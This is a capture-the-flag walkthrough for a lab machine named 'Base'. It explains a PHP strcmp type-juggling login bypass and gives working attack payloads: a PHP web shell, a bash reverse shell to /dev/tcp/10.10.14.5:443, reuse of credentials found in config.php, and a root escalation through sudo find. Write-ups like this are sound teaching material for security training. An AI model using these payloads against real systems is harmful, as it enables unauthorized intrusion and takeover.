# Base

# TL;DR

Target machine is running a webserver that has vulnerable login PHP code running on it that allows us to login without a username/password. Once logged in we are able to upload arbitrary `.php` files. This allows us to upload a reverse webshell. Once the listener on our local machine gets the shell we enumerate and find some credentials in the `config.php` file. We use this credentials to `ssh` into the remote host as the user and use this user to elevate our privileges to the `root` user.

# Enumeration

- `ping 10.129.95.184` : to test if the server is up and running.
- We scan the host to determine running services:
- ```
  nmap -sC -sV 10.129.95.184

  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 20:09 CDT
  Nmap scan report for 10.129.95.184
  Host is up (0.23s latency).
  Not shown: 998 closed tcp ports (reset)
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 f6:5c:9b:38:ec:a7:5c:79:1c:1f:18:1c:52:46:f7:0b (RSA)
  |   256 65:0c:f7:db:42:03:46:07:f2:12:89:fe:11:20:2c:53 (ECDSA)
  |_  256 b8:65:cd:3f:34:d8:02:6a:e3:18:23:3e:77:dd:87:40 (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  |_http-title: Welcome to Base
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 16.92 seconds
  ```
- From the scan we find the following service(s) running:
    - `OpenSSH` on port `22/tcp`
    - `Apache httpd` on port `80/tcp` 

# Foothold

- Since there is a webserver running on the machine we can visit the webpage in our browser. We can enumerate the webpage by clicking all the links to see if it leads to anything interesting. When we hit the `login` button it takes us to `http://10.129.95.184/login/login.php`. The `login.php` is in the `/login/` directory.
- When we visit the login directory we find the following files:
  - `config.php`
  - `login.php`
  - `login.php.swp`: The `.swp` file store changes that are made to the buffer. If Vim on your computer crashes, the swap files allow you to recover those changes. It also allows multiple instances of an editor like Vim from editing the same file. (This file was probably created when Vim crahsed while the developer was editing the file.)
- We can download the file by clicking it. Once downloaded we can recover it by runnning `vim -r [swap file]`. But sometimes these files can be particulare and wont recover.
- Since the `.swp` file is a temporary file, it contains a lot of non-human-readable content, thus we will use the `strings` utility to read the swap file because it only displays the human-readable text.
  - ```
    strings login.php.swp 
    b0VIM 8.0
    root
    base
    /var/www/html/login/login.php
    3210
    #"! 
    
    [** SNIP **]

    if (!empty($_POST['username']) && !empty($_POST['password'])) {
    session_start();
    <?php
    </html>
    </body>
      <script src="../assets/js/main.js"></script>
    ```
- We see a bunch of HTML/PHP code, but its out of order and a bit jumbled. The PHP code that handles the login appears to be upside down. To make it normal we can place the output of the `strings` command into a new `.txt` file and read it with the `tac` utility (Reads similar to `cat` but instead does so in a backwards manner).
  - ```
    strings login.php.swp >> file.txt
    tac file.txt

        <script src="../assets/js/main.js"></script>
      </body>
      </html>
      <?php
      session_start();
      if (!empty($_POST['username']) && !empty($_POST['password'])) {
          require('config.php');
          if (strcmp($username, $_POST['username']) == 0) {
              if (strcmp($password, $_POST['password']) == 0) {
                  $_SESSION['user_id'] = 1;
                  header("Location: /upload.php");
              } else {
                  print("<script>alert('Wrong Username or Password')</script>");
              }
          } else {
              print("<script>alert('Wrong Username or Password')</script>");
          }
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="utf-8">
        <meta content="width=device-width, initial-scale=1.0" name="viewport">
        <title>Welcome to Base</title>
        <meta content="" name="description">
        <meta content="" name="keywords">
        <!-- Favicons -->
        <link href="../assets/img/favicon.png" rel="icon">
        <link href="../assets/img/apple-touch-icon.png" rel="apple-touch-icon">
        <!-- Google Fonts -->
        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
        <!-- Vendor CSS Files -->
        <link href="../assets/vendor/aos/aos.css" rel="stylesheet">
        <link href="../assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
        <link href="../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
        <link href="../assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
        <link href="../assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
        <link href="../assets/vendor/remixicon/remixicon.css" rel="stylesheet">
        <link href="../assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
        <!-- Template Main CSS File -->
        <link href="../assets/css/style.css" rel="stylesheet">
      </head>
      <body>
        <!-- ======= Header ======= -->
        <header id="header" class="fixed-top">
          <div class="container d-flex align-items-center justify-content-between">
            <h1 class="logo"><a href="index.html">BASE</a></h1>
            <!-- Uncomment below if you prefer to use an image logo -->
            <!-- <a href="index.html" class="logo"><img src="../assets/img/logo.png" alt="" class="img-fluid"></a>-->
            <nav id="navbar" class="navbar">
              <ul>
                <li><a class="nav-link scrollto" href="/#hero">Home</a></li>
                <li><a class="nav-link scrollto" href="/#about">About</a></li>
                <li><a class="nav-link scrollto" href="/#services">Services</a></li>
                <li><a class="nav-link scrollto" href="/#team">Team</a></li>
                <li><a class="nav-link scrollto" href="/#pricing">Pricing</a></li>
                <li><a class="nav-link scrollto" href="/#contact">Contact</a></li>
                <li><a class="nav-link scrollto action" href="/login.php">Login</a></li>
              </ul>
              <i class="bi bi-list mobile-nav-toggle"></i>
            </nav><!-- .navbar -->
          </div>
        </header><!-- End Header -->
          <!-- ======= Login Section ======= -->
          <section id="login" class="contact section-bg" style="padding: 160px 0">
            <div class="container" data-aos="fade-up">
              <div class="section-title mt-5" >
                <h2>Login</h2>
                <p>Use the form below to log into your account.</p>
              </div>
              <div class="row mt-2">
                <div class="col-lg-12 mt-5 mt-lg-0">
                  <form id="login-form" action="" method="POST" role="form" style="background-color:#f8fbfe">
                    <div class="row" align="center">
                      <div class="form-group">
                        <input type="text" name="username" class="form-control" style="max-width: 30%;" id="username" placeholder="Your Username" required>
      #"! 
      3210
      /var/www/html/login/login.php
      base
      root
      b0VIM 8.0
    ```
- The logic checks the username/password combination that the user submits against the variables that are stored in the config file (which is potentially communicating with a database) to see if they match.
- The following code from the `login.php.swp` is vulnerable:
  - ```
    if (strcmp($username, $_POST['username']) == 0) {
              if (strcmp($password, $_POST['password']) == 0) {
    ```
  - The `strcmp` function is used for string comparison and returns `0` when the two inputted values are identical, however, it is insecure and the authentiction process can potentially be bypassed without having a valid username and password.
  - If `strcmp` is given an empty array to compare against the stored password, it will return `NULL`. In PHP the `==` operator only checks the value of a variable for equality, and the value of `NULL` is equal to `0`. The correct way to write it would be `===` operator which checks both value and type. (These are prominrntly know as "Juggling bugs").
  - In PHP, variables can be easily converted into arrays if we add `[]` in front of them. For example:
    - ```
      $username = "Admin"
      $username[] = "Admin"
      ```
  - Adding `[]` changes the variable `$username` to an array, which means that `strcmp()` will compare the array instead of a string.
  - In the comparison logic above we see that the comparison succeeds and returns `0` and the login is successfull. If we convert those variables into empty arrays, the comparison will return `NULL and NULL == 0` will return true, causing the login to be successfull.
- In order to exploit this vulnerability, we will intercept the login request in BurpSuite (Configure the browser to use it as a proxy, either with FoxyProxy plugin or the Browser configuration page).
- Once configured, we send a login request with arbitrary username and password and capture the request. Before forwarding the request we change the POST data as follows to bypass the login:
  - `username[]=admin&password[]=pass`: This converts the variables to arrays and after forwarding the request, `strcmp()` returns `true` and the login is successful. Once logged in, we see a file upload functionalty.
- Since the webpage can execute PHP code, we can try uploading a PHP file to check if PHP file uploads are allowed and also check for PHP code execution.
- We can upload a new `test.php` file with the following code:
  - ```
    echo "<?php phpinfo(); ?>" > test.php 
    ```
  - Once we upload the file we see a notification up top stating the upload was successfull.
- Next, we need to determine were the uploaded files are stored on the webserver.
  - ```

    ```
  - From the output above we see that there is a directory called `_uploaded`. When we visit the directory in our browser we find our `test.php` file uploaded in the last step. When we click on the file we see the `phpinfo()` function get executed and we are displayed with the output.
- Now that we know that we can upload `.php` we can upload a PHP web shell whoch uses the `system()` function and a `cmd` URL parameter to execute system commands.
  - We create a `webshell.php` file with the following code:
    - ```
      <?php echo system($_REQUEST['cmd']); ?>
      ```
    - We are making use of the `$_REQUEST` method to fetch the `cmd` parameter because it works for fetching both URL parameters in `GET` requests and HTTP request body parameter in case of `POST`.
    - We can now upload the `webshell.php` file. Once uploaded we are able to view it in `_uploaded` directory.
    - When we click on the file we are presented with a blank page. However, we are able to run commands through our browser in the URL bar by appending `?cmd=id` to the URL.
      - `http://10.129.95.194/_uploaded/webshell.php?cmd=id`: The URL returns the output of the `id` comamnd, letting us know that Apache is running in the context of the user `www-data`. Let's intercept this request in BurpSuite and send it to the repeater tab.
- Now that we know we can execute code on the remote system, let's attempt to get a reverse shell. The current request is an `HTTP GET` request and we can attempt to use it to send a command that will grant us a reverse shell on the system, however, it is likely that one might encounter errors due to the presence of special characters in the URL (even after URL encoding them). Instead, let us convert the `GET` request to a `POST` request and send the reverse shell command as an `HTTP POST` parameter. 
  * (Right-Click on the request body box, and click on the "Change request method" in order to convert this `HTTP GET` request to an `HTTP POST` request)
- In the repeater tab, we can alter the request and set the following reverse shell payload as a value for the `cmd` parameter.
  - ```
    /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5:443 0>&1'
    ```
  - In order to execute our payload we have to URL encode it. Select the payload and URL encode it with `CTRL+U`. It is important to URL encode they payload, or else the server will not interpert the command correctly. For example, in the POST bodym the `&` character is used to signal the start of a new parameter. But we have two `&` characters in our string that are both part of the `cmd` parameter. By encoding them, this tells the server to treat the entire string as part of the `cmd`.
  - Now we start the Netcat listener on port 443 and then send the request in Burp for the payload to execute with the following command:
    - ```
      sudo nc -lvnp 443
      ```
    - The reverse shell is successfully received by our listener when we send the request from Burp Suite.


# Lateral Movement

- Apache server is running as the `www-data` user and the shell we received is also running in the context of the user. `www-data` is a default user on the system where web servers are installed and usually has minimal privileges.
- We can enumerate the host. Let's first check the configuration file in the `login` folder that we found earlier. These configuration files often include credentials that are used to communicate with SQL or other DB servers.
  - ```
    cat /var/www/html/login/config.php

    <?php
    $username = "admin";
    $password = "thisisagoodpassword";
    ```
  - We see that the config files has some type of credentials. Sysadmins usually re-use passwords between web and system accounts.
  - We can enumerate further to see if the credentials is valid for any other system user. To do that, we will first list the files in the `/home` directory to quickly identify the users on the system.
  - `ls home`: We find a folder called `John` which gives us a valid username.
  - `su john`: usually we would use the `su` command to switch between users on a Linux host, however, as our shell is not fully interactive, this command will fail.
  - There are methods for upgrading this shell to an interactive shell, but luckliy, we can login as the user `John` over SSH (We know port 22 is open from our Nmpa scan) with the password thst we identified in the previous step.
  - `ssh john@10.129.95.184`: We are able to successfully login with the password found in the `config.php` file.
  - Once logged in we are able to find the `user.txt` in `/home/john/user.txt`

# Privilege Escalation

- We now need to escalate our privileges to that of the `root` user, who has the highest privileges in the system. Instead of running a system enumeration tool like `linPEAS`, let us first perform some basic manual enumeration. Upon checking the `sudo -l` command output, which lists the sudo privileges that our user is assigned, we see that user `john` can run the `find` command as a root.
  - ```

    john@base:~$ sudo -l
    [sudo] password for john: 

    Matching Defaults entries for john on base:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User john may run the following commands on base:
      (root : root) /usr/bin/find

    ```
  - It is rarely a good idea to allow a system user to run a binary with elevated privileges, as the default binaries on Linux often contain parameters that can be used to run system commands.
  - [GTFOBins](https://gtfobins.github.io/): is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigrued systems. ([LOLBAS](https://lolbas-project.github.io/): Windows equivalent)
  - From the GTFOBins we find that the `find` command if run with `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain escalated privileged access.
  - `sudo find . -exec /bin/bash \; -quit`: We now have a root shell.
  - We find the `root.txt` in `/root/` folder.



